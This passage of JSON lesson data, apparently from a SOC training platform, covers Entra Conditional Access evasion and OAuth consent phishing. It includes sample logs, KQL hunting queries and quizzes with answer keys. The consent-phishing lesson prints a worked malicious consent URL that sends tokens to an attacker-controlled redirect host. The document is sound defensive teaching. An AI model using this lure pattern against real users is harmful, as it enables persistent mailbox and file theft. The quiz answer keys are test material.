      "content": "### The airport security analogy\n\nImagine an airport security checkpoint that is not one-size-fits-all. A frequent flyer with a known travel history and pre-checked status walks through a fast, light-touch lane. A first-time traveller on a one-way ticket bought with cash gets pulled aside for extra screening. Neither is guilty of anything; the airport is simply applying **more scrutiny where the situation carries more uncertainty**, and letting low-risk situations move quickly. This is **adaptive access control**, and it is exactly what Conditional Access does for every sign-in to a cloud application.\n\n### What is a policy engine?\n\nA **policy engine** is software that evaluates a set of if-then rules against real-time facts and produces a decision. Instead of one fixed rule ('always require MFA' or 'never require MFA'), it looks at the specific situation — who is signing in, from where, on what device, to which app — and decides the appropriate response for that situation alone. This flexibility is the entire point: a rule that is too loose lets attackers straight through; a rule that is too strict makes every legitimate employee jump through hoops for zero benefit.\n\n### What is a claim, and why sign-in decisions are dynamic\n\nWhen a user authenticates, the identity provider issues a **token** containing **claims** — small facts about the user and the session, such as their group membership, the device's compliance state, or the calculated risk level. Conditional Access reads these claims at the moment of sign-in, which is why the same user, on the same day, might sail through from their office laptop but get challenged for MFA from a new phone in a different country — the claims are different, so the decision is different.\n\n### Why this matters before Conditional Access makes sense\n\nA password check alone is static: it either matches or it doesn't, regardless of context. Conditional Access adds context back in, the same way the airport checkpoint does — it does not replace the password check, it decides how much additional scrutiny that specific sign-in deserves. Every concept in the rest of this lesson, signals, conditions, grant controls, risk levels, is really just different ways of describing 'what extra scrutiny should this particular sign-in receive, and why.'"
    },
    {
      "heading": "How Conditional Access Works",
      "content": "**Microsoft Entra ID** is Microsoft's cloud identity provider, formerly called Azure Active Directory. **Conditional Access** is its policy engine, matching the primer's definition exactly, and it operates on a simple mental model: **signals lead to conditions lead to access controls**. Every authentication is evaluated against your policies before access is granted.\n\n**Signals** are facts about the sign-in: which user, which group, what application they are reaching, the device and its compliance state, the location or IP, the client app type, and the calculated **risk level** — these are the 'claims' from the primer, gathered together. **Conditions** are the tests a policy applies to those signals, for example 'user is in the Finance group AND the app is Exchange Online AND the location is outside the corporate network.' When the conditions match, the policy applies its **access controls**, which fall into two kinds.\n\n**Grant controls** decide whether and how to allow the sign-in: block access entirely, or grant it but require one or more conditions such as **multi-factor authentication (MFA)**, a **compliant device**, a **hybrid-joined device**, or an approved client app. **Session controls** shape what happens after access, such as limiting session lifetime or restricting downloads.\n\nHere is what an actual Conditional Access policy looks like, using real Microsoft Graph API field names, matching the airport analogy's 'more scrutiny for uncertain situations':\n\n```\n{\n  \"displayName\": \"Require MFA for risky sign-ins\",\n  \"state\": \"enabled\",\n  \"conditions\": {\n    \"users\": { \"includeUsers\": [\"All\"], \"excludeUsers\": [\"break-glass-admin\"] },\n    \"applications\": { \"includeApplications\": [\"All\"] },\n    \"signInRiskLevels\": [\"medium\", \"high\"]\n  },\n  \"grantControls\": {\n    \"operator\": \"OR\",\n    \"builtInControls\": [\"mfa\"]\n  }\n}\n```\n\nRead it as the if-then sentence from the primer: 'if the sign-in is for any user (except the excluded break-glass account) to any application, AND the calculated sign-in risk is medium or high, THEN require MFA.' The `excludeUsers` entry exists for exactly the reason airport staff have their own separate lane: a **break-glass account** is an emergency administrator account deliberately excluded from policies, so a misconfigured or overly strict rule can never lock every administrator out at once.\n\nPolicies are additive and evaluated together; all applicable policies must be satisfied. Because a misconfigured policy can lock out administrators or, conversely, leave a gap, Entra provides **report-only mode** to observe a policy's effect before enforcing it. For the SOC, understanding this signals-conditions-controls flow is what lets you explain why a given sign-in was challenged, allowed, or blocked when you read its log entry."
    },
    {
      "heading": "Identity Protection: Risky Users and Sign-ins",
      "content": "Conditional Access becomes far more powerful when it consumes risk from **Microsoft Entra ID Protection**. Identity Protection uses machine learning and Microsoft's threat intelligence to score two distinct things, expanding on the 'risk level' signal introduced in the previous section.\n\nA **risky sign-in** rates the likelihood that a specific authentication event was performed by someone other than the legitimate user, banded as **low**, **medium**, or **high** risk. Its detections include familiar signals covered elsewhere in this platform's identity lessons: anonymous IP address, atypical travel (impossible travel), unfamiliar sign-in properties, malicious IP address, password spray, and token anomalies.\n\nA **risky user** rates the likelihood that the account itself is compromised, accumulating from sign-in risk over time plus signals such as leaked credentials found in breach dumps. The two are complementary: you might challenge one risky sign-in, but a persistently risky user warrants a full remediation.\n\nDetections are either **real-time** or **offline**. Real-time detections resolve during the sign-in and can drive an immediate Conditional Access decision. Offline detections, such as impossible travel, are computed shortly afterward and raise the user's risk state for the next evaluation.\n\nConditional Access consumes these scores through **risk-based policies**. Two are foundational:\n\n- **Sign-in risk policy**: if sign-in risk is medium or high, require MFA (or block) — this is precisely the policy JSON shown in the previous section.\n- **User risk policy**: if user risk is high, require a secure password change, which also revokes existing sessions.\n\nThis closes a loop. Identity Protection detects a risky sign-in, Conditional Access reacts in the moment by demanding MFA, and if the user successfully completes MFA the risk can be automatically remediated and the sign-in allowed; if they cannot, access is denied. The result is a system that raises friction precisely when risk is elevated and stays invisible when it is not — the exact airport-checkpoint behaviour from the primer, now implemented in code.\n\nFor an analyst, the practical payoff is prioritisation. The risk band tells you which sign-ins to review first, the risky-user view tells you which accounts may need forced resets, and the remediation state tells you whether the platform already handled the event or is waiting for human action."
    },
    {
      "heading": "How Attackers Try to Evade It",
      "content": "Attackers know Conditional Access stands between them and the mailbox or data they want, so they probe for gaps rather than attacking MFA head-on.\n\n**Legacy authentication** is the classic bypass. Older protocols such as **IMAP**, **POP3**, **SMTP AUTH**, and legacy Exchange endpoints predate modern authentication and **cannot perform MFA or honour Conditional Access grant controls** the way modern auth does. If a tenant still permits legacy auth, an attacker who has a valid password can authenticate through it and sidestep the MFA requirement entirely. This is why Microsoft's strong recommendation, and a standard hardening step, is a Conditional Access policy that **blocks legacy authentication** outright. Password-spray campaigns disproportionately target legacy endpoints for exactly this reason.\n\nHere is what a successful legacy-auth bypass actually looks like in the sign-in log, using real field names:\n\n```\n{\n  \"createdDateTime\": \"2026-08-16T03:41:07Z\",\n  \"userPrincipalName\": \"r.levi@contoso.com\",\n  \"appDisplayName\": \"Office 365 Exchange Online\",\n  \"clientAppUsed\": \"IMAP4\",\n  \"ipAddress\": \"45.148.10.201\",\n  \"authenticationRequirement\": \"singleFactorAuthentication\",\n  \"conditionalAccessStatus\": \"notApplied\",\n  \"status\": { \"errorCode\": 0 }\n}\n```\n\nRead the two fields that matter most together: `clientAppUsed: \"IMAP4\"` (a legacy protocol) and `conditionalAccessStatus: \"notApplied\"` — Conditional Access never even evaluated this sign-in, because legacy protocols cannot carry the claims it needs, and `authenticationRequirement` confirms only a single factor (the password) was needed, at 03:41 in the morning, for a successful sign-in. This single log line is exactly the gap the previous paragraph describes, made concrete.\n\n**Token theft and replay** is the more modern evasion. Instead of stealing a password, the attacker steals an already-issued **session token** or **refresh token**, often via **adversary-in-the-middle (AiTM)** phishing that proxies the real login page and captures the post-MFA token. Replaying that token can grant access without re-triggering MFA, because from the service's view the user already authenticated. Microsoft counters this with detections for **token anomalies**, **continuous access evaluation**, and controls that bind tokens to compliant devices, but the technique remains a live threat and maps to **MITRE ATT&CK T1550, Use Alternate Authentication Material**.\n\nOther evasions include **consent phishing** to obtain OAuth tokens (covered in its own lesson), abusing **trusted-location** gaps by routing through an allowed IP range, and targeting accounts or apps mistakenly **excluded** from policies — recall the `excludeUsers` field from the policy JSON; a break-glass exclusion is safe, but an over-broad exclusion becomes a liability if an attacker discovers it.\n\nThe defensive lesson for the SOC is twofold. First, ensure the obvious doors are shut: block legacy auth, minimise exclusions, and require compliant devices for sensitive apps. Second, hunt for the subtle evasions: a successful sign-in that never shows an MFA challenge for an app that should require one, a legacy-protocol authentication that succeeded, or a token used from a device and IP that do not match where it was issued."
    },
    {
      "heading": "What the Analyst Sees and How to Respond",
      "content": "The **Entra sign-in logs** are where all of this becomes concrete for the SOC. Each sign-in entry records the user, application, timestamp, source IP and location, device and its compliance state, the **client app** (which reveals modern versus legacy auth, as seen in the previous section), the **conditional access** result showing which policies applied and whether they succeeded or failed, the **authentication requirement** (single-factor or MFA), the **risk level and risk state**, and the final **status** with any error code.\n\nRead these fields together to reconstruct the story. A healthy blocked attack looks like: high risk detected, Conditional Access policy applied, MFA required, MFA not satisfied, sign-in failed. That is the system working. The entries that demand attention are the mismatches.\n\nHunt for these patterns:\n\n- A **successful sign-in with client app = legacy** for a user or app that should be covered by MFA, exactly like the IMAP4 example above. Legacy auth succeeding is a red flag that a bypass path is open.\n- A **high-risk sign-in that still shows success** with only single-factor authentication, indicating a policy gap or an excluded account.\n- A sign-in where **Conditional Access = not applied** on a sensitive app, suggesting the policy scope missed it.\n- **Token or session** anomalies: a session reused from a new IP or device shortly after an AiTM-style phishing event.\n- A **risky user** who then performs sensitive actions such as registering a new MFA method or creating inbox forwarding rules.\n\n**Response** follows the evidence. For a confirmed risky account, use Identity Protection to **confirm the user as compromised**, which sharpens the model, then **force a secure password reset**, **revoke sessions and refresh tokens**, and require **re-registration of MFA** since attackers often add their own authenticator. Review the account's OAuth grants and mailbox rules for persistence. If a policy gap allowed the attack, feed that back into engineering: tighten the policy scope, remove the offending exclusion, or block the legacy protocol.\n\nThe overarching analyst skill is to treat the sign-in log as a narrative of the policy engine's decisions, exactly as the airport-checkpoint analogy framed it from the start. When the story reads cleanly, the controls worked; when a step is missing, an MFA that should have fired did not, a legacy path succeeded, a risky sign-in slipped through, you have found either an attack or the gap that an attacker will use next."
    },
    {
      "heading": "Hunting for Conditional Access Gaps",
      "content": "A mature SOC does not wait for a single alert to surface a legacy-auth bypass; it hunts for the whole category proactively, the same way the previous lesson built a hunting query for impossible travel.\n\n### A KQL query for legacy authentication\n\nIn Microsoft Sentinel, sign-in logs land in the `SigninLogs` table, and a straightforward hunting query finds exactly the gap described in the earlier IMAP4 example:\n\n```\nSigninLogs\n| where ClientAppUsed in (\"IMAP4\", \"POP3\", \"SMTP\", \"Autodiscover\", \"Exchange ActiveSync\")\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, ClientAppUsed, IPAddress, ConditionalAccessStatus\n```\n\nThis filters to only the legacy protocols that cannot honour Conditional Access, keeps only successful sign-ins (`ResultType == 0`), and surfaces exactly the fields you need to confirm the gap: who, which protocol, from where, and whether Conditional Access even evaluated the sign-in. Running this weekly, or as a scheduled analytics rule, turns 'we think legacy auth might still be enabled somewhere' into a concrete, evidenced finding you can hand to the identity team.\n\n### From hunt to hardening\n\nWhen this query returns results, the fix is rarely a detection tweak — it is closing the actual gap: adding the affected users or applications to the **block legacy authentication** Conditional Access policy, and re-running the query afterward to confirm the count drops to zero. This is the natural conclusion of everything in this lesson: Conditional Access is a policy engine that only protects what it actually evaluates, and the sign-in log is how you prove, in writing, whether that coverage is complete."
    }
  ],
  "keyTakeaways": [
    "Conditional Access is a policy engine that behaves like an adaptive airport checkpoint: it reads signals (claims in the sign-in token — user, device, location, risk) and evaluates conditions to apply access controls (block, or require MFA/compliant device), only for the exact situation at hand.",
    "A real Conditional Access policy is JSON with conditions (users, applications, signInRiskLevels) and grantControls (builtInControls like mfa); it consumes Identity Protection's risky-sign-in and risky-user scores through sign-in-risk and user-risk policies to react dynamically to threat.",
    "Attackers evade it mainly via legacy authentication (which cannot honour MFA — visible in logs as clientAppUsed: IMAP4/POP3/SMTP with conditionalAccessStatus: notApplied) and token theft/replay from AiTM phishing (MITRE T1550).",
    "Analysts read the sign-in log as a narrative: successful legacy auth, a high-risk sign-in succeeding on single factor, or Conditional Access showing 'not applied' on a sensitive app are all signs of a gap, not the system working correctly.",
    "Proactive hunting (e.g. a KQL query over SigninLogs filtering to legacy client apps) turns a suspected gap into evidence, and the fix is closing the policy gap itself (blocking legacy auth, tightening exclusions) rather than only tuning detections."
  ],
  "quiz": [
    {
      "question": "In the Entra sign-in logs you find a successful authentication to Exchange where the client app is a legacy protocol (IMAP), the user completed only single-factor authentication, and Conditional Access shows as not applied. Why is this concerning?",
      "options": [
        {
          "label": "Legacy protocols like IMAP cannot honour MFA grant controls, so the attacker bypassed the MFA requirement.",
          "value": "a"
        },
        {
          "label": "The sign-in used a compliant device, which always guarantees the account is safe from compromise.",
          "value": "b"
        },
        {
          "label": "IMAP sign-ins are automatically blocked by Entra, so this log entry must be a false record.",
          "value": "c"
        },
        {
          "label": "Single-factor authentication over IMAP still triggers the same risk scoring as modern auth flows.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Legacy authentication protocols such as IMAP predate modern auth and cannot perform MFA or honour Conditional Access grant controls, so a successful legacy sign-in with only single factor means the MFA requirement was bypassed. Option b is wrong and misleading; the entry does not indicate a compliant device and compliance never guarantees safety. Option c is false because Entra does not auto-block legacy auth unless a policy is configured to do so. Option d overstates legacy auth's risk visibility, which is precisely why blocking it is recommended."
    },
    {
      "question": "How does a risk-based Conditional Access sign-in policy typically respond when Identity Protection scores a sign-in as medium or high risk, assuming the user has MFA registered?",
      "options": [
        {
          "label": "It silently allows the sign-in and only records the risk level for later manual review by an analyst.",
          "value": "a"
        },
        {
          "label": "It permanently disables the user account and requires an administrator to manually re-enable it.",
          "value": "b"
        },
        {
          "label": "It requires MFA in the moment, and a successful challenge can automatically remediate the sign-in risk.",
          "value": "c"
        },
        {
          "label": "It reroutes the sign-in to a legacy authentication endpoint so the user can bypass the challenge.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "A sign-in-risk policy typically requires MFA when risk is medium or high; if the user successfully completes MFA, the risk can be automatically remediated and access granted, raising friction only when needed. Option a is wrong because the whole point is to act in the moment, not just log. Option b is too extreme and describes neither the sign-in-risk nor user-risk policy behaviour. Option d is nonsensical and dangerous, as legacy endpoints are what such policies aim to eliminate."
    },
    {
      "question": "A hunting query over SigninLogs filters to ClientAppUsed in ('IMAP4', 'POP3', 'SMTP') and ResultType == 0, and returns dozens of successful sign-ins with ConditionalAccessStatus = 'notApplied'. What is the most appropriate remediation, based on what these results indicate?",
      "options": [
        {
          "label": "Add all affected users and applications to the block-legacy-authentication Conditional Access policy, then re-run the query to confirm zero results.",
          "value": "a"
        },
        {
          "label": "Delete the SigninLogs table entries so the finding no longer appears in future audits of the tenant.",
          "value": "b"
        },
        {
          "label": "Increase the sign-in risk threshold required to trigger MFA, since legacy protocols already imply lower risk.",
          "value": "c"
        },
        {
          "label": "Disable Identity Protection entirely, since it clearly failed to evaluate these legacy sign-ins in the first place.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The results prove legacy authentication is still active and bypassing Conditional Access entirely, so the fix is closing that actual gap by blocking legacy auth for the affected scope, then confirming with the same query that the count drops to zero. Option b hides evidence without fixing anything and is inappropriate practice. Option c is backwards; legacy protocols should be treated with more scrutiny, not less. Option d misdiagnoses the issue: Identity Protection did not fail, Conditional Access simply cannot evaluate protocols that do not support modern authentication claims."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview",
    "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks",
    "https://attack.mitre.org/techniques/T1550/",
    "https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-block-legacy-authentication",
    "https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions"
  ],
  "xp": 260,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-oauth-consent-phishing",
  "slug": "oauth-consent-phishing",
  "title": "OAuth Consent Phishing (Illicit Consent Grants)",
  "topic": "Email Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Not every account takeover involves stealing a password. In OAuth consent phishing, the victim is tricked into clicking Accept on a legitimate-looking permission screen, granting a malicious application ongoing access to their mailbox and data. This lesson assumes no prior OAuth background: it starts by defining what delegated access and a token actually are, using a valet-key analogy, then walks through how OAuth consent phishing works step by step with a real consent URL and audit log, why it is so dangerous, mapped to MITRE ATT&CK technique T1528, and how a SOC analyst detects and defends against it with a worked hunting query.",
  "sections": [
    {
      "heading": "Start Here: What OAuth, a Token, and Delegated Access Actually Are",
      "content": "### The valet key analogy\n\nMany cars come with a **valet key**: a second key that starts the engine and unlocks the doors, but cannot open the glovebox or the trunk. You hand it to a parking valet so they can do their one job, park the car, without being able to do anything else with it. **OAuth** is the digital version of a valet key. It is an open standard that lets you grant one application **limited, specific access** to your data in another service, without ever handing over your actual password (the master key).\n\n### What is delegated access, a scope, and a token?\n\nWhen you click 'Sign in with Microsoft' or authorise a calendar app to see your schedule, you are performing **delegated access**: you are delegating a narrow slice of your account's abilities to a third-party app, on your behalf, without sharing your password. The specific slice being requested is called a **scope** or **permission** — 'read my calendar' is one scope, 'read and send my email' is a much broader one. In exchange, the identity provider issues the app a **token**: a small, cryptographically signed piece of data (the valet key itself) that the app presents to prove it has been granted exactly those scopes, and no more.\n\n### What is an OAuth application, and why the browser is involved\n\nAn **OAuth application** (or **app registration**) is any third-party service that wants delegated access — a calendar add-in, a mail-backup tool, a scheduling assistant. To grant it access, your browser is redirected to your identity provider's own, genuine **consent screen**, which lists exactly which scopes the app is requesting. You review the list and click **Accept** or **Cancel**. This is the moment the valet key is actually cut and handed over.\n\n### Why this matters before consent phishing makes sense\n\nHere is the entire attack in one sentence, once the valet-key idea is clear: **the danger is not a stolen master key, it is a legitimate victim voluntarily handing out a valet key to someone pretending to be a valid parking attendant.** Nothing about the mechanism is broken; OAuth is working exactly as designed. The attack lives entirely in the victim's judgement about *who* they are handing the key to, which is precisely why it defeats defences built around protecting the master key (the password) alone."
    },
    {
      "heading": "What OAuth Consent Phishing Is",
      "content": "**OAuth consent phishing**, also known as an **illicit consent grant** attack, abuses the legitimate valet-key mechanism from the primer. Instead of stealing credentials, the attacker registers a malicious **OAuth application** and lures the victim to its consent screen. The victim sees a normal Microsoft or Google permission prompt, often for an app with a benign-sounding name, and clicks **Accept**. In doing so they grant the attacker's app the permissions it requested against **their own account**. MITRE ATT&CK catalogues this as technique **T1528, Steal Application Access Token**, within the broader consent-abuse pattern.\n\nThe crucial insight, following directly from the primer, is that **the victim's password is never involved**. The user authenticated normally to their own identity provider; what they got wrong was approving an untrustworthy third party, handing the valet key to the wrong person. The attacker never sees the password and never needs to. From the identity provider's perspective, the user made a valid, authenticated choice to delegate access.\n\nThe permissions (scopes) the attacker requests are deliberately chosen for durability and reach. Common ones include:\n\n- **offline_access**, which grants a **refresh token** so the app can keep obtaining new access tokens indefinitely without the user present — the valet key that never has to be returned.\n- **Mail.Read** or **Mail.ReadWrite**, granting read or write access to the entire mailbox.\n- **Files.Read.All**, **User.Read**, and contact or calendar scopes to expand reach.\n\nHere is what the actual consent link the victim clicks looks like — note that it points to Microsoft's own genuine domain, not an attacker-controlled one:\n\n```\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8f3b2e91-4a1c-4e77-9b2d-1234567890ab&response_type=code&redirect_uri=https%3A%2F%2Fmailsync-helper.net%2Fcallback&scope=Mail.Read%20offline_access%20Files.Read.All\n```\n\nRead the `scope` parameter decoded: `Mail.Read offline_access Files.Read.All`. With `offline_access` plus `Mail.Read`, the attacker's application can silently read the victim's email around the clock. The whole attack can look, to the user, like nothing more than authorising a productivity add-in. That ordinariness is what makes consent phishing effective and why it deserves a distinct detection strategy separate from credential theft."
    },
    {
      "heading": "How the Attack Works Step by Step",
      "content": "The attack follows a repeatable sequence, and understanding each stage tells the analyst where to look.\n\n### Step 1: Register a malicious app\n\nThe attacker creates an OAuth application in their own tenant or a throwaway one, configuring it to request the scopes they want, such as `offline_access`, `Mail.Read`, and `Files.Read.All`. They give it a plausible name, sometimes impersonating a known brand or a generic tool like 'Mail Sync Helper' — the exact app named in the consent URL from the previous section.\n\n### Step 2: Craft the lure\n\nThe attacker sends a phishing email or message containing the consent link shown above, with the malicious app's `client_id` embedded. Because the link points to a genuine Microsoft or Google domain (`login.microsoftonline.com`), it passes many URL-reputation checks and looks trustworthy. This is a key difference from classic credential phishing, where the fake login page lives on an attacker domain — here, only the `redirect_uri` (`mailsync-helper.net`) belongs to the attacker, and it is easy to miss inside a long, URL-encoded link.\n\n### Step 3: Victim consents\n\nThe victim clicks, authenticates to their real provider (satisfying any MFA), and is shown the consent screen listing the requested permissions. Many users click **Accept** without scrutinising the scopes, especially if the app name looks routine. At this moment the provider issues the app an **access token** and, thanks to `offline_access`, a **refresh token** — the valet key is now in the attacker's hands.\n\n### Step 4: Attacker uses the token\n\nThe malicious app now calls the provider's API, for example Microsoft Graph, to read mail, download files, or harvest contacts, using the tokens rather than any password. The traffic originates from the app's infrastructure and is authorised, so it does not look like a suspicious login.\n\n### Step 5: Persist and act on objectives\n\nThe refresh token lets the attacker maintain access over time. They may set up mailbox forwarding, search for sensitive data, or use the mailbox for **business email compromise** to phish the victim's contacts from a trusted account.\n\n| Stage | Attacker action | Analyst artefact |\n|-------|-----------------|------------------|\n| Register | Create app, request scopes | New app registration |\n| Lure | Send link to real consent URL | Phishing email |\n| Consent | Victim clicks Accept | 'Consent to application' audit event |\n| Use | Call Graph API with token | OAuth app data access |\n| Persist | Reuse refresh token | Ongoing app activity |\n\nEach stage leaves a trace, and the consent event in Step 3 is the pivotal one for detection, covered with a real log in a later section."
    },
    {
      "heading": "Why It Is So Dangerous",
      "content": "OAuth consent phishing is dangerous precisely because it sidesteps the defences organisations trust most, and it hides inside legitimate machinery.\n\nFirst, **it survives password resets**. In a credential-theft incident, forcing the victim to change their password cuts off the attacker. Here the attacker never had the password; they hold a **refresh token** tied to a consented app, the valet key from the primer, which was never linked to the ignition key in the first place. Resetting the password does nothing to that grant. The standard first-response reflex fails, and if the analyst does not know to revoke the consent, access continues.\n\nSecond, **it survives MFA**. Multi-factor authentication protects the sign-in. But the victim already completed MFA when they authenticated to their real provider before consenting. The token the attacker holds represents an already-MFA'd session's delegated access, so re-prompting for MFA never occurs for the app's background API calls. MFA, the control most organisations lean on hardest, provides no protection once consent is granted.\n\nThird, **it blends into normal traffic**. The malicious app calls the same APIs that legitimate add-ins use, from cloud infrastructure, with valid tokens. There is no failed-login spike, no impossible travel, no brute force. Behavioural sign-in detections that catch credential attacks may see nothing, because from the identity layer's view nothing anomalous is happening.\n\nFourth, **the phishing link is trustworthy on its face**. The lure points to the provider's real consent endpoint on a genuine domain, so URL filtering and user 'check the domain' training often pass it. The user is not fooled about the domain; they are fooled about the app, exactly as the valet-key analogy predicted: the mechanism was never broken, only the judgement about who to trust with it.\n\nFinally, the **access is broad and persistent**. With mailbox read/write and file scopes, the attacker can exfiltrate data continuously and pivot to **business email compromise**, sending internal phishing from a genuinely trusted account. Because the mailbox belongs to a real, respected colleague, downstream victims are far more likely to comply.\n\nTaken together, these properties make consent phishing a quiet, durable compromise that defeats the password-and-MFA mindset. It forces the SOC to think in terms of **delegated access and app governance**, not just logins, which is exactly why the detection and defence approach differs from everything else in the identity playbook."
    },
    {
      "heading": "Detection: Reading the Consent Audit Log",
      "content": "Because consent phishing hides in legitimate flows, detection centres on the **consent and app-permission events** rather than on sign-in anomalies. In **Microsoft Entra**, the primary source is the **audit log**, and it is worth reading one of these events field by field the same way you read the consent URL earlier.\n\nHere is the actual audit event created the moment a victim clicks Accept on the 'Mail Sync Helper' consent screen from the earlier sections:\n\n```\n{\n  \"activityDisplayName\": \"Consent to application\",\n  \"category\": \"ApplicationManagement\",\n  \"result\": \"success\",\n  \"activityDateTime\": \"2026-08-16T08:22:04Z\",\n  \"initiatedBy\": {\n    \"user\": { \"userPrincipalName\": \"d.cohen@contoso.com\" }\n  },\n  \"targetResources\": [\n    {\n      \"displayName\": \"Mail Sync Helper\",\n      \"type\": \"ServicePrincipal\",\n      \"modifiedProperties\": [\n        { \"displayName\": \"ConsentAction.Permissions\", \"newValue\": \"Mail.Read offline_access Files.Read.All\" }\n      ]\n    }\n  ]\n}\n```\n\nRead it exactly like the consent URL: `activityDisplayName: \"Consent to application\"` is the headline event type, `initiatedBy.user.userPrincipalName` names the victim, `targetResources[0].displayName` names the app they consented to, and the nested `modifiedProperties` entry shows the exact scopes granted — the same `Mail.Read offline_access Files.Read.All` string from the consent link. This single event is your ground truth for exactly what happened, when, to whom, and to what extent.\n\n### The signals to hunt for\n\n- The **'Consent to application'** audit event itself — a spike of these across many users, or grants to an app no one recognises, is the headline indicator.\n- Sensitive scopes inside `modifiedProperties`, especially `Mail.Read`, `Mail.ReadWrite`, `offline_access`, and `Files.Read.All` appearing together, exactly as in the worked example.\n- **Newly registered or newly consented applications** with low prevalence in your tenant, generic or brand-imitating names, publishers that are unverified, or `redirect_uri` values pointing to unfamiliar domains, like `mailsync-helper.net` from the consent URL.\n- **Multiple users consenting to the same unfamiliar app** in a short window, which signals a campaign rather than a one-off.\n- Correlation with a **phishing email** wave and with the app then accessing Graph mail data.\n\nMicrosoft Defender for Cloud Apps and the built-in **OAuth app governance** and **risky OAuth app** detections can surface suspicious apps automatically; treat their findings as leads and confirm in the audit log, reading it field by field exactly as above, which users and scopes are involved."
    },
    {
      "heading": "Defence and Response",
      "content": "Defence works on prevention plus governance, and the most effective controls remove the click that makes the attack work in the first place, going back to the valet-key analogy: stop untrusted parties from ever being handed a key at all.\n\n- **Restrict user consent.** Configure the tenant so users cannot freely consent to third-party apps, or can consent only to **verified publishers** for **low-risk permissions**. This is the single most effective control, because it removes the moment of decision from an untrained user entirely.\n- **Enable an admin consent workflow.** When an app needs permissions beyond the allowed baseline, route the request to administrators for review, so a human evaluates the app and scopes before any grant — a security team checking the valet's credentials before handing over the key.\n- **Periodically review app grants.** Audit existing enterprise applications and their consented permissions, and remove apps that are unused, over-permissioned, or unrecognised.\n- **Educate users** that a consent screen is a security decision, and that a trustworthy domain in the URL (as seen in the consent link example) does not mean a trustworthy app — the domain proves the mechanism is genuine, not that the requester is.\n\n### A hunting query to find existing risky grants\n\nBeyond waiting for an alert, a SOC can proactively search the audit log for exactly the pattern in the worked example. In Microsoft Sentinel, using the `AuditLogs` table:\n\n```\nAuditLogs\n| where ActivityDisplayName == \"Consent to application\"\n| extend Scopes = tostring(TargetResources[0].modifiedProperties[0].newValue)\n| where Scopes has_any (\"offline_access\", \"Mail.ReadWrite\", \"Files.Read.All\")\n| project TimeGenerated, InitiatedBy, TargetResources, Scopes\n```\n\nThis filters every consent event tenant-wide down to only the ones granting the high-value, durable scopes attackers favour, surfacing exactly the fields, who consented, to what app, with what scopes, needed to review each grant on its merits. Running this on a schedule turns 'has anyone in our tenant already granted a risky app broad mailbox access?' from a guess into an answered question.\n\n### Response to a confirmed incident\n\nResponse to a confirmed incident is specific: **revoke the malicious app's consent and delete the service principal**, **revoke the affected users' refresh tokens** to kill active sessions, review mailboxes for forwarding rules or other persistence, and hunt for what the token accessed. Note that a password reset alone is insufficient here, exactly as the earlier section explained; revoking the grant and the tokens is what actually removes the attacker. Feeding the offending app and its indicators back into blocklists closes the loop for the next campaign."
    }
  ],
  "keyTakeaways": [
    "OAuth is a 'valet key' for accounts: delegated access via scopes and tokens, granted through a genuine consent screen, without ever sharing the password (the master key) — the mechanism is legitimate, which is exactly what consent phishing abuses.",
    "OAuth consent phishing (MITRE T1528) tricks a user into approving a malicious app's scopes such as offline_access and Mail.Read via a link to the provider's real consent domain; because no password is involved, the resulting token-based access survives password resets and MFA and blends into legitimate API traffic.",
    "The attack follows five stages (register app, craft lure to the real consent URL, victim consents, attacker uses the token, attacker persists via refresh token), and each stage leaves a trace, with the 'Consent to application' audit event being the pivotal one for detection.",
    "Detection reads real Entra audit log fields (activityDisplayName, initiatedBy.user.userPrincipalName, targetResources[].modifiedProperties with the granted scopes) to find unfamiliar apps granted sensitive, durable scopes; a Sentinel AuditLogs query can proactively surface existing risky grants tenant-wide.",
    "Defence is restricting user consent, enabling an admin consent workflow, and reviewing existing grants; response requires revoking the app consent and refresh tokens, not just resetting the password, since the attacker's access was never tied to the password in the first place."
  ],
  "quiz": [
    {
      "question": "A user reports clicking Accept on a Microsoft permission screen for an app called 'Mail Sync Helper' after receiving an email link. You confirm the app was granted offline_access and Mail.Read. The user then changed their password. Why is the password change alone insufficient to stop the attacker?",
      "options": [
        {
          "label": "The password change failed to propagate because the account still had an active MFA session token.",
          "value": "a"
        },
        {
          "label": "The attacker holds a refresh token from the consented app, so mailbox access continues despite the reset.",
          "value": "b"
        },
        {
          "label": "Password changes never affect email access because mailboxes use a separate credential system entirely.",
          "value": "c"
        },
        {
          "label": "The app will simply request the password again automatically the next time it needs to read mail.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "In consent phishing the attacker never had the password; they hold a refresh token granted to the consented app, so resetting the password does not revoke that delegated access, and mailbox reads continue. Proper response is to revoke the app consent and the refresh tokens. Option a invents a propagation failure that is not the mechanism. Option c is false; mailboxes do use the account credential, but that is beside the point since no password is involved in the grant. Option d misunderstands OAuth, where the app uses tokens, not the password."
    },
    {
      "question": "Which preventive control most directly stops OAuth consent phishing from succeeding in an Entra ID tenant?",
      "options": [
        {
          "label": "Requiring users to change their passwords more frequently and enforcing longer minimum password length.",
          "value": "a"
        },
        {
          "label": "Blocking all inbound email attachments so phishing lures can never reach end users at all.",
          "value": "b"
        },
        {
          "label": "Restricting user consent so users cannot freely grant third-party apps, routing requests to admin review.",
          "value": "c"
        },
        {
          "label": "Enabling impossible-travel detection so distant sign-ins from the malicious app are always flagged.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Restricting user consent removes the click that makes the attack work: if users cannot freely grant third-party apps and instead requests go through an admin consent workflow, a human reviews the app and scopes before any grant is issued. Option a addresses credentials, which are irrelevant since no password is stolen. Option b is impractical and misses the point, since the lure links to a real consent URL, not an attachment. Option d does not help because consent phishing produces no anomalous sign-in for the user; the app's token use blends into normal API traffic."
    },
    {
